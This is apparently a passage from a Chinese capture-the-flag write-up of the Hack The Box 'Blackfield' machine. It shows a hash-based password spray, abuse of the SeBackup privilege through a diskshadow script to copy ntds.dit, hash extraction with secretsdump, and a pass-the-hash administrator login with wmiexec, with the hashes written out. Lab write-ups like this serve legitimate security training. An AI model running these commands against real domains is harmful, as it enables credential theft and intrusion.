BLACKFIELD441759         BLACKFIELD446463         BLACKFIELD448641
BLACKFIELD454313         BLACKFIELD460131         BLACKFIELD464763
BLACKFIELD465267         BLACKFIELD468839         BLACKFIELD478410
BLACKFIELD478828         BLACKFIELD484290         BLACKFIELD488531
BLACKFIELD496547         BLACKFIELD497216         BLACKFIELD500073
BLACKFIELD512331         BLACKFIELD518316         BLACKFIELD520852
BLACKFIELD522135         BLACKFIELD532412         BLACKFIELD533060
BLACKFIELD533551         BLACKFIELD533886         BLACKFIELD534196
BLACKFIELD534956         BLACKFIELD538365         BLACKFIELD541148
BLACKFIELD544934         BLACKFIELD546640         BLACKFIELD548394
BLACKFIELD548464         BLACKFIELD549571         BLACKFIELD553715
BLACKFIELD558867         BLACKFIELD561870         BLACKFIELD566117
BLACKFIELD569313         BLACKFIELD569653         BLACKFIELD573498
BLACKFIELD576233         BLACKFIELD579344         BLACKFIELD579980
BLACKFIELD584113         BLACKFIELD586592         BLACKFIELD586934
BLACKFIELD591846         BLACKFIELD592556         BLACKFIELD594619
BLACKFIELD600999         BLACKFIELD601590         BLACKFIELD602567
BLACKFIELD606328         BLACKFIELD606964         BLACKFIELD607290
BLACKFIELD608914         BLACKFIELD609423         BLACKFIELD611993
BLACKFIELD613771         BLACKFIELD616527         BLACKFIELD617630
BLACKFIELD618519         BLACKFIELD622501         BLACKFIELD623122
BLACKFIELD624385         BLACKFIELD631162         BLACKFIELD631599
BLACKFIELD632329         BLACKFIELD634593         BLACKFIELD635996
BLACKFIELD639103         BLACKFIELD644281         BLACKFIELD651599
BLACKFIELD652779         BLACKFIELD653097         BLACKFIELD657263
BLACKFIELD665997         BLACKFIELD673073         BLACKFIELD676303
BLACKFIELD680939         BLACKFIELD682842         BLACKFIELD682949
BLACKFIELD683323         BLACKFIELD684814         BLACKFIELD686428
BLACKFIELD690642         BLACKFIELD691480         BLACKFIELD694429
BLACKFIELD695166         BLACKFIELD697473         BLACKFIELD701303
BLACKFIELD704154         BLACKFIELD706381         BLACKFIELD710285
BLACKFIELD713470         BLACKFIELD717683         BLACKFIELD724669
BLACKFIELD727512         BLACKFIELD732035         BLACKFIELD739227
BLACKFIELD739659         BLACKFIELD739765         BLACKFIELD744790
BLACKFIELD753480         BLACKFIELD753537         BLACKFIELD758945
BLACKFIELD759042         BLACKFIELD759079         BLACKFIELD763893
BLACKFIELD764430         BLACKFIELD765350         BLACKFIELD765982
BLACKFIELD767498         BLACKFIELD767820         BLACKFIELD768095
BLACKFIELD773118         BLACKFIELD773423         BLACKFIELD774376
BLACKFIELD775126         BLACKFIELD775986         BLACKFIELD781404
BLACKFIELD787464         BLACKFIELD787995         BLACKFIELD788523
BLACKFIELD789969         BLACKFIELD792484         BLACKFIELD793029
BLACKFIELD796301         BLACKFIELD802251         BLACKFIELD802875
BLACKFIELD813266         BLACKFIELD818863         BLACKFIELD819822
BLACKFIELD820995         BLACKFIELD826622         BLACKFIELD827906
BLACKFIELD828826         BLACKFIELD835725         BLACKFIELD837541
BLACKFIELD838710         BLACKFIELD839613         BLACKFIELD840481
BLACKFIELD842438         BLACKFIELD842593         BLACKFIELD843883
BLACKFIELD848660         BLACKFIELD859776         BLACKFIELD868068
BLACKFIELD869335         BLACKFIELD871753         BLACKFIELD875008
BLACKFIELD876916         BLACKFIELD877328         BLACKFIELD883784
BLACKFIELD884808         BLACKFIELD894905         BLACKFIELD895235
BLACKFIELD896715         BLACKFIELD898237         BLACKFIELD899238
BLACKFIELD899433         BLACKFIELD907614         BLACKFIELD908329
BLACKFIELD909590         BLACKFIELD911926         BLACKFIELD926559
BLACKFIELD932709         BLACKFIELD933887         BLACKFIELD937395
BLACKFIELD939200         BLACKFIELD939243         BLACKFIELD946435
BLACKFIELD946509         BLACKFIELD962495         BLACKFIELD962999
BLACKFIELD969352         BLACKFIELD971417         BLACKFIELD978938
BLACKFIELD990638         BLACKFIELD991588         BLACKFIELD994577
BLACKFIELD995218         BLACKFIELD996878         BLACKFIELD997545
BLACKFIELD998321                             
lydericlefebvre                            
```

```
cat userdc | awk -F" " '{print $1}'  >> userdcc
```

![image](https://github.com/user-attachments/assets/c6fc09b6-0cea-4c18-bd26-eb57780bd3fe)


进行密码喷洒

```
crackmapexec smb 10.10.10.192 -u userdcc -H aad3b435b51404eeaad3b435b51404ee:67ef902eae0d740df6257f273de75051
```

不过一个没成功

![image](https://github.com/user-attachments/assets/f77a3938-85fb-4922-b80c-d798e05e3fd9)


 然后我看wp去了，发现利用的DiskShadow

参考:[HTB： 黑原 |0xdf hacks 的东西](https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#grab-ntdsdit)

有时第一种方式读出来的不一定是对的，就比方HTB Blackfield这台机子，需要用到disk shadow技术结合SeBackup权限。

在这种方式下，我们需要读取ntds.dit和hklm\system，hklm\system我们可以轻松读取，但是ntds.dit不行，我们读取看看

```
Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit .
```

![image](https://github.com/user-attachments/assets/1945f14f-e3e9-4252-806e-b40252bccfbd)


所以我们就需要disk shadow技术来读取

> Diskshadow.exe 是一种工具，用于公开卷影复制服务 （VSS） 提供的功能。默认情况下，Diskshadow 使用类似于 Diskraid 或 Diskpart 的交互式命令解释器。Diskshadow 还包括可编写脚本的模式。

https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow

我们写一个txt文件，内容为

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
add volume c: alias df
create
expose %df% z:
```

写好后在kali进行格式转换

```
unix2dos 1.txt
```

![image](https://github.com/user-attachments/assets/ab60309e-fd0a-4959-9610-15b1551ae963)


然后上传，执行如下命令

```
diskshadow /s 1.txt
```

![image](https://github.com/user-attachments/assets/41c5dde5-31a7-4e04-9090-c963050e0500)

```
Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit .\ntds.dit
```

![image](https://github.com/user-attachments/assets/81a66c3a-e1dd-4287-9b13-326984538e75)


接着进行清理清理

```
set context persistent nowriters
set metadata c:\programdata\df.cab
set verbose on
delete shadows volume df
reset
```

```
unix2dos 1.txt
diskshadow /s 1.txt
```

然后我们读取下hash

```
secretsdump.py -system system -ntds ntds.dit LOCAL
```

![image](https://github.com/user-attachments/assets/bb2d558b-f43a-4c09-a3f6-d4f55b9f023e)


进行登录

```
wmiexec.py -hashes :184fb5e5178480be64824d4cd53b99ee administrator@10.10.10.192
```

这里psexec还登录不了

![image](https://github.com/user-attachments/assets/3db591d8-3cab-4c51-a1aa-e1bd1d5f625f)


成功

